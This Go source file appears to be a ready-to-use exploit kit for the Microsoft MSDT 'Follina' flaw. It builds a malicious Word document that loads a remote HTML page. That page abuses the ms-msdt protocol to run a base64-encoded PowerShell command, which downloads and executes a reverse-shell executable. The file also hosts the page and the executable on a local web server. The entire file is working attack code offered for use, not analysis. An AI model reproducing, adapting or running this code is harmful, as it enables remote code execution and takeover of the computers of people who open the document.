package main

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"flag"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	url, port := initArgs()
	payload_url := "http://" + url + ":" + port
	createMaliciousDocx(payload_url)
	createPayload(payload_url)
	hostDropper(port)
}

func initArgs() (string, string) {
	url := flag.String("url", "localhost", "The hostname or IP address where the generated document should retrieve your payload, defaults to \"localhost\".")
	port := flag.String("port", "80", "The port to run the HTTP server on, defaults to 80")
	flag.Parse()
	return *url, *port
}

func createMaliciousDocx(payload_url string) {
	file_byte, err := os.ReadFile("template/document.xml.rels.template")
	handleError("Read document rels", err)
	file_byte = bytes.ReplaceAll(file_byte, []byte("{staged_html}"), []byte(payload_url+"/payload.html"))
	err = os.WriteFile("template/doc/word/_rels/document.xml.rels", file_byte, 0644)
	handleError("Write document rels with payload", err)
	zipDoc()
	println("[+] Malicious file created at tmp/file.docx")
}

func zipDoc() {
	outFile, err := os.Create(`tmp/file.docx`)
	handleError("Create malicious doc", err)
	defer outFile.Close()
	zipWriter := zip.NewWriter(outFile)
	addFilesToArchive(zipWriter, "template/doc/", "")
	defer zipWriter.Close()
}

func addFilesToArchive(zipWriter *zip.Writer, basePath, baseZipPath string) {
	files, err := ioutil.ReadDir(basePath)
	handleError("ZIP Reading dir "+basePath, err)
	for _, file := range files {
		filePath := basePath + file.Name()
		if !file.IsDir() {
			fileByte, err := ioutil.ReadFile(filePath)
			handleError("ZIP Reading file "+filePath, err)
			newFile, err := zipWriter.Create(baseZipPath + file.Name())
			handleError("ZIP Create file "+filePath, err)
			_, err = newFile.Write(fileByte)
			handleError("ZIP Write in file "+filePath, err)
		} else {
			addFilesToArchive(zipWriter, filePath+"/", baseZipPath+file.Name()+"/")
		}
	}
}

func createPayload(payload_url string) {
	revshell_command := "Invoke-WebRequest " + payload_url + `/poop.exe -OutFile poop.exe; .\poop.exe`
	base64_revshell_command := base64.StdEncoding.EncodeToString([]byte(revshell_command))
	html_payload := `<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //` + generateRandomString(4096) + "\n</script>"
	html_payload = strings.ReplaceAll(html_payload, "{base64_payload}", base64_revshell_command)
	err := os.WriteFile("tmp/payload.html", []byte(html_payload), 0644)
	handleError("Write HTML payload", err)
}

func generateRandomString(length int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	rand.Seed(time.Now().UnixNano())
	random_string := make([]rune, length)
	for i := range random_string {
		random_string[i] = letters[rand.Intn(len(letters))]
	}
	return string(random_string)
}

func hostDropper(port string) {
	println("[+] Hosting payload on port :" + port)
	http.HandleFunc("/payload.html", func(w http.ResponseWriter, r *http.Request) {
		print("a")
		http.ServeFile(w, r, "tmp/payload.html")
	})
	http.HandleFunc("/poop.exe", func(w http.ResponseWriter, r *http.Request) {
		println("'btdfr")
		http.ServeFile(w, r, "tmp/Go-RevShell.exe")
	})
	http.ListenAndServe(":"+port, nil)
}

func handleError(reason string, err error) {
	if err != nil {
		log.Fatal(reason + " : " + err.Error())
	}
}
